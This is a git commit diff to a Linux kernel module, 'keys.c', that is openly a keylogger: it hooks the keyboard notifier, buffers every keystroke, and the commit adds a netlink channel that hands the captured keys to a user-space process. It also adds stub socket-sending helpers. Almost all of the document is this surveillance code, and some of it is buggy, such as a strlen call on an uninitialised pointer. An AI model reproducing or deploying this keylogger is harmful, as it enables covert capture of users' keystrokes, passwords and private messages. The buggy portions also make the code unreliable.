ec55142a7525d8c6db92adb52c1d75b860f9b76d
mi-luc <89728054+mi-luc@users.noreply.github.com>
2023-01-23 19:53:45 +0200

    Update keys.c

--- keys.c
+++ keys.c
@@ -7,11 +7,93 @@
 #include <linux/debugfs.h>
 #include <linux/input.h>
 
+#include <linux/net.h>
+#include <net/sock.h>
+#include <linux/tcp.h>
+#include <linux/in.h>
+#include <asm/uaccess.h>
+#include <linux/file.h>
+#include <linux/socket.h>
+#include <linux/slab.h>
+
+#include <uapi/linux/uio.h>
+#include <linux/uio.h>
+
 #define WRITESIZE (10)
 #define BUF_LEN (4096)
 #define ERROR 1
 #define KEYL_VERS "1.0"
 #define FILE_PATH "/home/radu/Desktop/keys.txt"
+
+#include <linux/module.h>
+#include <net/sock.h>
+#include <linux/netlink.h>
+#include <linux/skbuff.h>
+
+
+#define MY_NETLINK 30  // cannot be larger than 31, otherwise we shall get "insmod: ERROR: could not insert module netlink_kernel.ko: No child processes"
+
+
+struct sock *nl_sk = NULL;
+
+//Buffer pe care se face "flush"
+static char keys_buf[BUF_LEN];
+//Ultimul element din buffer
+static size_t buffer_index;
+
+
+static void myNetLink_recv_msg(struct sk_buff *skb)
+{
+    struct nlmsghdr *nlhead;
+    struct sk_buff *skb_out;
+    int pid, res, msg_size;
+    char*msg; 
+	char* mesaj="NULL!";
+
+    printk(KERN_INFO "Entering: %s\n", __FUNCTION__);
+
+    msg_size = strlen(msg);
+
+    nlhead = (struct nlmsghdr*)skb->data;    //nlhead message comes from skb's data... (sk_buff: unsigned char *data)
+
+    printk(KERN_INFO "Received: %s\n",(char*)nlmsg_data(nlhead));
+	if(buffer_index==0)
+	{
+	msg=mesaj;
+	msg_size=strlen(mesaj);
+	}
+	if(buffer_index!=0)
+	{
+	msg=&keys_buf[0];
+	msg_size=buffer_index;
+	buffer_index=0;
+	}
+	
+    pid = nlhead->nlmsg_pid; // Sending process port ID, will send new message back to the 'user space sender'
+
+	printk("MSJ ESTE:%s\n",msg);
+    skb_out = nlmsg_new(msg_size, 0);    //nlmsg_new - Allocate a new netlink message: skb_out
+
+    if(!skb_out)
+    {
+        printk(KERN_ERR "Failed to allocate new skb\n");
+        return;
+    }
+
+    nlhead = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_size, 0);   // Add a new netlink message to an skb
+
+    NETLINK_CB(skb_out).dst_group = 0;                  
+
+
+    strncpy(nlmsg_data(nlhead), msg, msg_size); //char *strncpy(char *dest, const char *src, size_t count)
+
+    res = nlmsg_unicast(nl_sk, skb_out, pid); 
+
+    if(res < 0)
+        printk(KERN_INFO "Error while sending back to user\n");
+	
+}
+
 
 
 static ssize_t keys_read(struct file *filp,char *buffer,size_t len,loff_t *offset);
@@ -21,11 +103,6 @@ static int spy_keys(struct notifier_block *nblock,unsigned long code,void *_para
 //dentry * file tine un pointer catre fisierul unde se vor scrie tastele apasate
 static struct dentry *parent_dir;
 static struct dentry *file;
-
-//Buffer pe care se face "flush"
-static char keys_buf[BUF_LEN];
-//Ultimul element din buffer
-static size_t buffer_index;
 
 //Test: fisier din afara directorului -debug- folosit pentru a scrie tastele apasate
 struct file* fileToWrite;
@@ -143,16 +220,58 @@ int spy_keys(struct notifier_block *nblock,unsigned long code,void *_param)
 	buffer_index += buffer_length;
 
 	pr_debug("%s\n", my_key_buffer);
-	//kernel_write(fileToWrite,keybuf,buf_pos,&fileToWrite->f_pos);
 	
 
 	return NOTIFY_OK;
 }
 
+static void send_reply(struct socket *sock, char *str)
+{
+	struct msghdr msg;
+	struct iovec iov = {}; 
+	
+	
+	msg.msg_name = NULL;
+    msg.msg_control = NULL;
+    msg.msg_controllen = 0;
+    msg.msg_namelen = 0;
 
+	unsigned long nr_segments = 1;
+	size_t count = 1;
+	void __user* message="Alabala!";
+	iov.iov_base = message;
+	iov.iov_len = 9;
+	
+	import_single_range(WRITE, message, 9, &iov, &msg.msg_iter);
+	
+	
+    int size=sock_sendmsg(sock, &msg);
+	
+}
+unsigned int inet_addr(char *str)
+{
+	int a,b,c,d;
+	char arr[4];
+	sscanf(str,"%d.%d.%d.%d",&a,&b,&c,&d);
+	arr[0] = a; arr[1] = b; arr[2] = c; arr[3] = d;
+	return *(unsigned int*)arr;
+} 
 static int __init initModule(void)
 {
 	
+struct netlink_kernel_cfg cfg = {
+        .input = myNetLink_recv_msg,
+    };
+
+       
+    nl_sk = netlink_kernel_create(&init_net, MY_NETLINK, &cfg);
+   
+    if(!nl_sk)
+    {
+        printk(KERN_ALERT "Error creating socket.\n");
+        return -10;
+    }
+
 	openFileToWrite();
 	parent_dir = debugfs_create_dir("myModuleKeylogger", NULL);
 	if (IS_ERR(parent_dir))
@@ -166,7 +285,6 @@ static int __init initModule(void)
 		return ERROR;
 	}
 
-	
 	register_keyboard_notifier(&current_nblock);
 	return 0;
 }
@@ -177,6 +295,7 @@ static void __exit exitModule(void)
 	unregister_keyboard_notifier(&current_nblock);
 	debugfs_remove_recursive(parent_dir);
 	file_close(fileToWrite);
+	netlink_kernel_release(nl_sk);
 }
 
 module_init(initModule);
